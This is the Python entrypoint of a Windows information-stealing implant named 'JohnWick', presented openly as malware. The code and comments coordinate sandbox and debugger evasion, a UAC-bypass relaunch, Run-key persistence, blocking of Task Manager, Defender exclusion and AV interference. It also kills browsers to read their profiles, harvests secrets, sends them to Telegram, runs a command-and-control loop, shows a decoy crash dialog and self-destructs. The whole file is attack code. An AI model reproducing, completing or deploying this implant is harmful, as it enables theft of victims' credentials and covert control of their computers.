"""JohnWick implant - Windows entrypoint.

Single exe, many victims: one compiled binary beacons to the destination baked
into cfg.json by builder.py. The same artifact runs on every machine; per-victim
identity comes from the system info, not from a re-build.

Pipeline at launch:
  1. load + validate config (fail closed)
  2. guard layer: anti-vm / anti-debug -> bail silently if analysed
  3. licence check (optional; only if cfg has licence_url)
  4. persistence write (HKCU Run key) unless disabled
  5. Task Manager block (registry policy) unless disabled
  6. AV/Defender handling: enumeration + hosts blocklist (guarded, reversible)
  7. first exfil burst (secrets -> telegram), then enter C2 loop

Every stage is wrapped so one failure degrades capability instead of killing
the process. Nothing here raises out of main(); a dead implant is worse than a
crippled one.

Run order is deliberate: guard BEFORE any network or disk write, so an analysis
sandbox never sees the beacon and never leaves a startup entry behind.
"""
from __future__ import annotations

import os
import sys
import threading


def _is_windows() -> bool:
    return sys.platform == "win32"


def _exe_path_safe() -> str:
    """Absolute path to the running exe, for Defender exclusion of its folder."""
    if getattr(sys, "frozen", False):
        return sys.executable or (sys.argv[0] if sys.argv else "")
    return os.path.abspath(sys.argv[0]) if sys.argv else ""


def main(argv=None) -> int:
    # Import-time platform gate: this file is Windows-only by design. On other
    # OSes we say so and exit clean rather than half-running.
    if not _is_windows():
        print("[jwg] windows-only implant; run under windows", file=sys.stderr)
        return 3

    import jwg_cfg
    try:
        cfg = jwg_cfg.load()
    except jwg_cfg.ConfigError as e:
        print(f"[jwg] config: {e}", file=sys.stderr)
        return 2

    opts = cfg.get("opts", {})

    # ---- startup delay ------------------------------------------------------
    # Sit quiet before doing anything; a burst-on-launch is the loudest tell.
    delay = int(opts.get("startup_delay", 0))
    if delay > 0:
        import time
        time.sleep(delay)

    # ---- fake error decoy ---------------------------------------------------
    # If enabled, pop a convincing "this app failed" dialog so an eyeballed
    # double-click has an innocent explanation while the real work runs in the
    # background thread. Only cosmetic; never blocks execution.
    if opts.get("fake_error"):
        threading.Thread(target=_fake_error_dialog, args=(opts.get("error_text") or
                         "This app has stopped working."), daemon=True).start()

    # ---- UAC bypass / re-launch elevated ------------------------------------
    # Best-effort: only meaningful when we're an admin-account member without a
    # raised token. Fails closed to the standard-user path otherwise.
    if opts.get("uac_bypass"):
        try:
            import persist
            if persist.try_elevate_relaunch():
                return 0  # parent exits; elevated child now owns the run
        except Exception:
            pass

    # ---- guard layer: must fire before anything touches disk or net --------
    try:
        import guard
        if cfg.get("guard_enabled", True):
            verdict = guard.evaluate(cfg)
            if verdict["analysis"]:
                # In a VM/debugger/sandbox: do nothing observable. No beacon,
                # no file writes, no registry keys. Just leave.
                return 0
    except Exception:
        pass  # a broken guard must not brick a live box

    # ---- licensing ----------------------------------------------------------
    try:
        import licensing
        licensing.check(cfg)  # raises LicenceError when unauthorised
    except Exception as e:
        # Unlicensed build: report once to the operator chat, then stop.
        try:
            import c2
            c2.notify(cfg, f"[licence] refused: {type(e).__name__}: {e}")
        except Exception:
            pass
        return 4

    # ---- persistence + taskmgr block ---------------------------------------
    try:
        import persist
        if cfg.get("persistence_enabled", True) and opts.get("startup", True):
            persist.install()
    except Exception:
        pass
    try:
        import persist
        if cfg.get("block_taskmgr", True):
            persist.block_task_manager()
    except Exception:
        pass

    # ---- AV surface ---------------------------------------------------------
    try:
        import guard
        guard.av_recon_and_block(cfg)  # enumerate + optional hosts blocklist
        if opts.get("defender_exclusion"):
            guard.defender_add_exclusion(os.path.dirname(_exe_path_safe()))
    except Exception:
        pass

    # ---- kill browsers (frees locked profile DBs before we read them) -------
    if opts.get("kill_browsers"):
        try:
            import stealer
            stealer.kill_browsers()
        except Exception:
            pass

    # ---- exfil + C2 ---------------------------------------------------------
    try:
        import stealer
        secrets = stealer.collect_all(cfg)
    except Exception as e:
        secrets = {"error": str(e)}

    import c2
    # First burst in background so the C2 command loop starts immediately;
    # a slow browser-profile read must not delay interactive control.
    threading.Thread(target=c2.first_report, args=(cfg, secrets), daemon=True).start()

    # Self-destruct: after the first report lands, wipe traces + remove startup
    # entry + delete own exe, then exit. Runs on a timer so the harvest ships
    # before the box forgets we were here.
    if opts.get("self_destruct"):
        threading.Thread(target=_schedule_self_destruct, args=(cfg,), daemon=True).start()

    c2.loop(cfg)
    return 0


def _fake_error_dialog(text: str) -> None:
    """Cosmetic MessageBox so a visible double-click looks like a crashed app."""
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, text, "Application Error", 0x10)
    except Exception:
        pass


def _schedule_self_destruct(cfg: dict) -> None:
    """Give the first report time to send, then burn the implant."""
    import time
    time.sleep(max(20, float(cfg.get("exfil_interval", 120)) * 0.5))
    try:
        import persist
        persist.uninstall()
    except Exception:
        pass
    try:
        persist.self_delete()
    except Exception:
        pass
    os._exit(0)


if __name__ == "__main__":
    raise SystemExit(main())
